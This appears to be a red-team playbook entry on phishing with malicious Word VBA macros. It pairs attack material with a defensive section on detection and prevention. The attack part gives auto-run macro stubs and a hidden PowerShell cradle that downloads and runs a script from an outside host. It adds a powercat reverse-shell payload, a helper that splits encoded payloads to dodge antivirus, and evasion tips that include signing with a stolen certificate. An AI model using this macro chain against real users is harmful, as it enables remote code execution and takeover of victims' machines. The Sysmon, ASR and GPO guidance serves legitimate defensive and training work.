name: Office - Malicious VBA Macro
command:
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
description: Classic client-side phishing vector: embed a VBA macro in a Word document that fires on open (AutoOpen / Document_Open) and runs a PowerShell download-and-execute cradle. The document must be saved as the macro-enabled legacy .doc (Word 97-2003) so the macro survives, then delivered to a user who clicks 'Enable Content' past Protected View.

examples.label: VBA auto-run stubs
examples.command:
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub

examples.label: PowerShell download-exec inside the macro
examples.command:
Str = "powershell -nop -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.128/run.ps1')"""
GetObject("winmgmts:").Get("Win32_Process").Create Str, Null, Null, pid

examples.label: Python helper: split a base64 PS command into VBA Str lines (run on Kali)
examples.command:
python3 -c "
import sys
s = open(sys.argv[1]).read().strip()
n = 50
for i in range(0, len(s), n):
    print('    Str = Str + ' + chr(34) + s[i:i+n] + chr(34))
" payload.txt

examples.label: Simple exec variant — WScript.Shell instead of WMI (less evasion, easier to understand)
examples.command:
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
' vs WMI exec (harder to detect):
' GetObject("winmgmts:").Get("Win32_Process").Create Str, Null, Null, pid

examples.label: Chapter-canonical powercat payload — encode this and split into Str lines for the macro
examples.command:
IEX(New-Object System.Net.WebClient).DownloadString('http://<lhost>/powercat.ps1');powercat -c <lhost> -p 4444 -e powershell
# 1. Base64-encode on Kali:  echo -n '<above>' | iconv -t UTF-16LE | base64 -w 0
# 2. Wrap: powershell.exe -nop -w hidden -e <base64>
# 3. Run python helper to split into Str = Str + "..." lines
# 4. Paste into Sub MyMacro() Dim Str As String block

notes: Split the PowerShell string across VBA variables (Str = Str + "...") to defeat trivial AV string matching. AutoOpen fires when the doc opens; Document_Open covers the template context - include both. The file MUST be saved as .doc (or .docm); a plain .docx cannot store macros. Delivery still depends on the user clicking Enable Content, so pretext matters. Pair with client-recon-fingerprint to confirm the target actually runs Office before sending.

references.title: Red Team Notes - Phishing with MS Office

recommended.note: Fingerprint the target OS/Office version before crafting the macro payload.
If the target opens links in a browser rather than Office docs, deliver an .hta instead.
No-macro alternative when Office macro execution policy is enforced.

defense.why_it_works: Microsoft Office macro (VBA) code executes within the Office process with the user's privileges. Macros can call WinAPI functions directly or invoke PowerShell via Shell/WScript.Shell to download and execute payloads. Auto-execution macros (AutoOpen, AutoExec, Document_Open) trigger when a document is opened. Delivered via phishing, exploiting trust in Office documents and the user's desire to 'Enable Content' when prompted.
defense.prerequisites: Target opens the malicious Office document and clicks 'Enable Macros' (or macro execution is policy-enabled). Office application installed. Network connectivity for payload download. VBA macros not blocked by Trust Center policies.
defense.impact: T1566.001 Phishing: Spearphishing Attachment + T1204.002 User Execution: Malicious File + T1059.001 PowerShell. Initial access via malicious document — one of the most common initial access vectors. VBA can invoke PowerShell for in-memory payload execution, download-and-execute additional stages, or directly call WinAPI.
defense.detection:
Sysmon Event 1: WINWORD.EXE/EXCEL.EXE spawning PowerShell, cmd.exe, wscript, mshta. Event 4688: Office process spawning non-Office children. ASR rule alerts: Office macro creating child process. EDR: VBA calling WinAPI pattern. Email gateway: malicious macro detection. AMSI: PowerShell payload from macro caught by AMSI.
Unusual inbound email with attachments or URLs followed by new process execution or suspicious document behavior; correlate email metadata, file creation, and network activity (DET0070/AN0188).
Mail logs with suspicious file writes or outbound connections after email delivery (AN0189).
Mac Mail app anomalies: attachments saved and immediately executed, or Safari/Preview launching files from email (AN0190).
Office documents with macros spawning child processes; correlate Office logs with execution and network connections (AN0191).
Anomalous IdP login attempts from suspicious email invitations or fake SSO prompts; correlate with MFA bypass and geo anomalies (AN0192).
SaaS-delivered phishing (chat/collaboration): anomalous link clicks, suspicious uploads, token misuse after delivery (AN0193).
defense.artifacts: Sysmon Event 1: WINWORD.EXE → powershell.exe/cmd.exe | Event 4688: Office spawning shells | ASR audit/block event | AMSI block event | Email gateway: macro in attachment flagged | EDR: VBA WinAPI call alert
defense.prevention:
Disable macros in Office via GPO: User Config → Admin Templates → Microsoft Word/Excel → Trust Center → Macro Settings → Disable all macros without notification. ASR rule: 'Block Office macros from creating child processes' (Defender). Email gateway: scan for macros in Office attachments. Microsoft 365 safe attachments: detonates attachments in sandbox. Enable Protected View (opens downloaded files read-only). Require trusted publisher signatures for macros.
Antivirus/Antimalware: Auto-quarantine suspicious files.
Audit: Scan systems and configurations for weaknesses.
Network Intrusion Prevention: Use NIP systems to scan and block malicious email attachments or links.
Restrict Web-Based Content: Block access to websites or attachment types (.scr, .exe, .pif, .cpl) used for phishing if not needed for business.
Software Configuration: Use anti-spoofing/email authentication (SPF, DKIM, DMARC) to filter messages based on sender domain validity and message integrity.
User Training: Train users to identify social engineering techniques and phishing emails.
defense.evasion: Use Excel 4.0 (XLM) macros instead of VBA — different detection path. Use Office macro to create a scheduled task or registry run key rather than spawning a child process directly (bypasses child-process ASR rules). Sign macro with a stolen code signing cert.
defense.misconfiguration: Office macros not disabled by GPO. ASR child process rule not enabled. Email gateway doesn't inspect macro content. Protected View disabled for network/internet locations.
defense.vulnerable_config:
# Macros enabled in Trust Center:
# User Config → Admin Templates → Microsoft Office 2016 → Security Settings → Trust Center
# → Macro Settings: Enable all macros = CRITICAL

# Protected View disabled:
# Trust Center → Protected View: all options unchecked
# → Files from internet open directly in edit mode = macros auto-execute
defense.secure_config:
# Disable macros via GPO:
# User Config → Admin Templates → Microsoft Office → Trust Center → Macro Settings
# → Disable VBA macros without notification: Enabled

# ASR rules:
Set-MpPreference -AttackSurfaceReductionRules_Ids @(
  '2B5223F8-AC7F-4C4E-B2BD-69ECC11D8FE4',  # Office: block child process creation
  '3B576869-A4EC-4529-8536-B80A7769E899',  # Office: block executable content
  '75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84'   # Office: block process injection
) -AttackSurfaceReductionRules_Actions @('Enabled','Enabled','Enabled')
